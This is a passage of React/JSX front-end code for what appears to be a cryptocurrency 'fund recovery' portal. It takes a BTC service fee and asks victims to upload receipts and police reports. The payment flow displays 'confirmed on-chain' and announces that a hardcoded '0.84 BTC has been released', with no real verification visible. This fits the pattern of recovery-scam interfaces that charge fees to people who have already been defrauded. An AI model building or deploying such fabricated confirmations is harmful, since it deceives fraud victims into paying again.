                              <input type="file" accept="image/*,application/pdf" className="hidden" onChange={e => onReceiptFile(e.target.files?.[0])} />
                            </label>
                          )}
                        </div>

                        <button onClick={sendPayment} disabled={!receiptName}
                          className="w-full bg-[#f7931a] text-white font-medium py-3 rounded-xl hover:bg-[#e07e10] transition-all flex items-center justify-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed">
                          I Have Sent the Payment — Verify <ChevronRight size={15} />
                        </button>
                      </div>
                    </div>
                  </div>
                )}

                {/* Received phase */}
                {phase === 'received' && (
                  <div className="bg-white border border-[#00875a]/20 rounded-xl p-10 text-center">
                    <div className="w-14 h-14 bg-[#e3f5ee] rounded-full flex items-center justify-center mx-auto mb-4 animate-pulse-ring">
                      <Check size={24} className="text-[#00875a]" />
                    </div>
                    <h3 className="font-semibold text-lg mb-2">Payment Received</h3>
                    <p className="font-mono text-sm text-[#00875a] mb-1">{feeBtc} BTC confirmed on-chain</p>
                    <p className="text-[#3d4452] text-sm max-w-sm mx-auto">Your receipt has been sent to our verification desk. Confirming and preparing your release...</p>
                  </div>
                )}

                {/* Processing phase */}
                {phase === 'processing' && (
                  <div className="bg-white border border-[#e2e6ed] rounded-xl p-10 text-center">
                    <div className="w-14 h-14 border-2 border-[#f7931a]/20 border-t-[#f7931a] rounded-full animate-spin mx-auto mb-4" />
                    <h3 className="font-semibold text-lg mb-2">Processing Your Release</h3>
                    <p className="font-mono text-xs text-[#6b7280] mb-4">Preparing transfer · Broadcasting to network</p>
                    <div className="max-w-xs mx-auto h-1.5 bg-[#f1f3f7] rounded-full overflow-hidden">
                      <div className="h-full bg-[#f7931a] rounded-full animate-progress" />
                    </div>
                  </div>
                )}

                {/* Done phase */}
                {phase === 'done' && (
                  <div className="bg-white border border-[#00875a]/20 rounded-xl p-10 text-center">
                    <div className="w-14 h-14 bg-[#e3f5ee] rounded-full flex items-center justify-center mx-auto mb-4">
                      <Wallet size={24} className="text-[#00875a]" />
                    </div>
                    <h3 className="font-semibold text-lg mb-2">Done — Check Your Wallets</h3>
                    <p className="text-[#3d4452] text-sm max-w-sm mx-auto mb-2">Your 0.84 BTC has been released back to your original wallet address.</p>
                    <p className="font-mono text-xs text-[#00875a] mb-6">{scanAddr}</p>
                    <button onClick={resetScanner}
                      className="bg-[#f7931a] text-white font-medium px-6 py-3 rounded-xl hover:bg-[#e07e10] transition-colors text-sm">
                      Scan Another Wallet
                    </button>
                  </div>
                )}
              </div>
            )}

            {/* Evidence */}
            {tab === 'evidence' && (
              <div className="space-y-4">
                <div className="bg-white border border-[#e2e6ed] rounded-xl p-5">
                  <div className="flex items-center justify-between mb-4">
                    <h2 className="font-semibold">Submitted Evidence</h2>
                    <label className="flex items-center gap-1.5 text-xs text-[#0057ff] hover:underline font-medium cursor-pointer">
                      <FileUp size={13} /> Upload Document
                      <input type="file" accept="image/*,application/pdf" className="hidden" onChange={e => onEvidenceFile(e.target.files?.[0])} />
                    </label>
                  </div>
                  {evidence.length === 0 ? (
                    <div className="py-12 text-center">
                      <div className="w-12 h-12 rounded-full bg-[#f1f3f7] flex items-center justify-center mx-auto mb-3">
                        <FolderOpen size={20} className="text-[#6b7280]" />
                      </div>
                      <p className="font-medium text-sm mb-1">No evidence uploaded yet</p>
                      <p className="text-sm text-[#6b7280] max-w-sm mx-auto">Police reports, exchange records and screenshots you upload will appear here.</p>
                    </div>
                  ) : evidence.map(e => (
                    <div key={e.id} className="flex items-center justify-between gap-3 py-3.5 border-b border-[#e2e6ed] last:border-0">
                      <div className="flex items-center gap-3 min-w-0">
                        <div className="w-9 h-9 bg-[#e8f0ff] rounded-lg flex items-center justify-center flex-shrink-0">
                          <FileText size={15} className="text-[#0057ff]" />
                        </div>
                        <div className="min-w-0">
                          <p className="text-sm font-medium truncate">{e.name}</p>
                          <p className="font-mono text-xs text-[#6b7280]">{e.size} · {e.type} · {e.date}</p>
                        </div>
                      </div>
                      <div className="flex items-center gap-3 flex-shrink-0">
                        <span className={`font-mono text-[10px] px-2 py-0.5 rounded-full ${
                          e.status === 'Verified' ? 'bg-[#e3f5ee] text-[#00875a]' : 'bg-[#fef3c7] text-[#b45309]'
                        }`}>{e.status}</span>
                        {e.dataUrl ? (
                          <a href={e.dataUrl} download={e.name} title="Download" className="text-[#6b7280] hover:text-[#0057ff] transition-colors"><Download size={14} /></a>
                        ) : (
                          <span title="Stored locally — metadata only"><Lock size={14} className="text-[#c8cfd9]" /></span>
                        )}
                      </div>
                    </div>
                  ))}
                  <p className="mt-4 text-xs text-[#6b7280] flex items-center gap-1.5"><Lock size={11} /> Demo mode: files are stored only in your browser (localStorage) — nothing is sent to a server.</p>
                </div>
                {evidenceError && (
                  <div className="bg-[#fef3c7] rounded-xl p-4 flex gap-3">
                    <AlertTriangle size={16} className="text-[#b45309] flex-shrink-0 mt-0.5" />
                    <p className="text-sm text-[#b45309]">{evidenceError}</p>
                  </div>
                )}
              </div>
            )}

            {/* Invoices */}
            {tab === 'invoices' && (
              <div className="space-y-4">
                <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
                  {[
                    { label: 'Total Paid', value: `$${totalPaid.toLocaleString(undefined, { minimumFractionDigits: 2 })}` },
                    { label: 'Outstanding', value: `$${outstanding.toLocaleString(undefined, { minimumFractionDigits: 2 })}` },
                    { label: 'Next Payment', value: nextInvoice ? nextInvoice.id : '—' },
                  ].map(s => (
                    <div key={s.label} className="bg-white border border-[#e2e6ed] rounded-xl p-5">
                      <p className="text-xs text-[#6b7280] mb-1">{s.label}</p>
                      <p className="font-heading font-700 text-xl">{s.value}</p>
                    </div>
                  ))}
                </div>
                <div className="bg-white border border-[#e2e6ed] rounded-xl overflow-hidden">
                  <div className="px-5 py-4 border-b border-[#e2e6ed] flex items-center justify-between">
                    <p className="font-medium text-sm">Invoices & Payment History</p>
                  </div>
                  <div className="overflow-x-auto">
                    <table className="w-full text-sm">
                      <thead>
                        <tr className="border-b border-[#e2e6ed] bg-[#f8f9fb]">
                          {['Invoice', 'Amount', 'Currency', 'Date', 'Method', 'Status', 'Tx Hash', ''].map(h => (
                            <th key={h} className="px-5 py-3 text-left font-mono text-[10px] text-[#6b7280] uppercase tracking-widest whitespace-nowrap">{h}</th>
                          ))}
                        </tr>
                      </thead>
                      <tbody>
                        {invoices.length === 0 ? (
                          <tr>
                            <td colSpan={8}>
                              <div className="py-12 text-center">
                                <div className="w-12 h-12 rounded-full bg-[#f1f3f7] flex items-center justify-center mx-auto mb-3">
                                  <Receipt size={20} className="text-[#6b7280]" />
                                </div>
                                <p className="font-medium text-sm mb-1">No invoices yet</p>
                                <p className="text-sm text-[#6b7280] max-w-sm mx-auto">Invoices appear when a recovery scan locates funds and a service fee is billed.</p>
                              </div>
                            </td>
                          </tr>
                        ) : invoices.map(p => (
                          <tr key={p.id} className="border-b border-[#e2e6ed] last:border-0 hover:bg-[#f8f9fb] transition-colors">
                            <td className="px-5 py-3.5 font-mono text-xs text-[#0057ff]">{p.id}</td>
                            <td className="px-5 py-3.5 font-mono text-sm font-medium">{p.amount}</td>
                            <td className="px-5 py-3.5 text-xs text-[#3d4452]">{p.currency}</td>
                            <td className="px-5 py-3.5 font-mono text-xs text-[#6b7280]">{p.date}</td>
                            <td className="px-5 py-3.5 text-xs text-[#3d4452]">{p.method}</td>
                            <td className="px-5 py-3.5">
                              <span className={`font-mono text-[10px] px-2 py-0.5 rounded-full ${
                                p.status === 'Paid' ? 'bg-[#e3f5ee] text-[#00875a]' : 'bg-[#fef3c7] text-[#b45309]'
                              }`}>{p.status}</span>
                            </td>
                            <td className="px-5 py-3.5 font-mono text-xs text-[#6b7280]">{p.tx}</td>
                            <td className="px-5 py-3.5">
                              <button className="flex items-center gap-1 text-xs text-[#0057ff] hover:underline font-medium"><Download size={12} /> PDF</button>
                            </td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                </div>
              </div>
            )}

            {/* Reports */}
            {tab === 'reports' && (
              <div className="space-y-4">
                <div className="bg-white border border-[#e2e6ed] rounded-xl p-5">
                  <h2 className="font-semibold mb-4">Investigation Reports</h2>
                  {reports.length === 0 ? (
                    <div className="py-12 text-center">
                      <div className="w-12 h-12 rounded-full bg-[#f1f3f7] flex items-center justify-center mx-auto mb-3">
                        <Download size={20} className="text-[#6b7280]" />
                      </div>
                      <p className="font-medium text-sm mb-1">No reports yet</p>
                      <p className="text-sm text-[#6b7280] max-w-sm mx-auto">Investigation reports become available after a recovery is completed.</p>
                    </div>
                  ) : reports.map(r => (
                    <div key={r.id} className="flex items-center justify-between py-3.5 border-b border-[#e2e6ed] last:border-0">
                      <div className="flex items-center gap-3 min-w-0">
                        <div className="w-9 h-9 bg-[#e8f0ff] rounded-lg flex items-center justify-center flex-shrink-0">
                          <FileText size={15} className="text-[#0057ff]" />
                        </div>
                        <div className="min-w-0">
                          <p className="text-sm font-medium truncate">{r.name}</p>
                          <p className="font-mono text-xs text-[#6b7280]">{r.date} · {r.format}{r.pages ? ` · ${r.pages} pages` : ''}</p>
                        </div>
                      </div>
                      <button className="flex items-center gap-1.5 text-xs text-[#0057ff] hover:underline font-medium flex-shrink-0">
                        <Download size={13} /> Download
                      </button>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* Notifications */}
            {tab === 'notifications' && (
              <div className="bg-white border border-[#e2e6ed] rounded-xl">
                <div className="px-5 py-4 border-b border-[#e2e6ed] flex items-center justify-between">
                  <p className="font-medium">Notifications</p>
                  <button onClick={() => setNotifications(prev => prev.map(n => ({ ...n, unread: false })))}
                    className="text-xs text-[#0057ff] hover:underline">Mark all read</button>
                </div>
                <div className="divide-y divide-[#e2e6ed]">
                  {notifications.length === 0 ? (
                    <div className="py-12 text-center">
                      <div className="w-12 h-12 rounded-full bg-[#f1f3f7] flex items-center justify-center mx-auto mb-3">
                        <Bell size={20} className="text-[#6b7280]" />
                      </div>
                      <p className="font-medium text-sm mb-1">No notifications yet</p>
                      <p className="text-sm text-[#6b7280]">Case updates and payment alerts will show up here.</p>
                    </div>
                  ) : notifications.map(n => {
                    const Icon = NOTIF_ICONS[n.icon]
                    return (
                      <div key={n.id} className="flex items-center gap-4 px-5 py-4 hover:bg-[#f8f9fb] transition-colors">
                        <div className={`w-8 h-8 rounded-lg flex items-center justify-center flex-shrink-0 ${n.unread ? 'bg-[#f7931a]/10 text-[#f7931a]' : 'bg-[#f1f3f7] text-[#6b7280]'}`}>
                          <Icon size={14} />
                        </div>
                        <div className="flex-1">
                          <p className="text-sm font-medium">{n.text}</p>
                          <p className="font-mono text-xs text-[#6b7280]">{n.time}</p>
                        </div>
                        {n.unread && <span className="w-2 h-2 rounded-full bg-[#f7931a]" />}
                      </div>
                    )
                  })}
                </div>
              </div>
            )}

          </div>
        </div>
      </div>

    </div>
  )
}
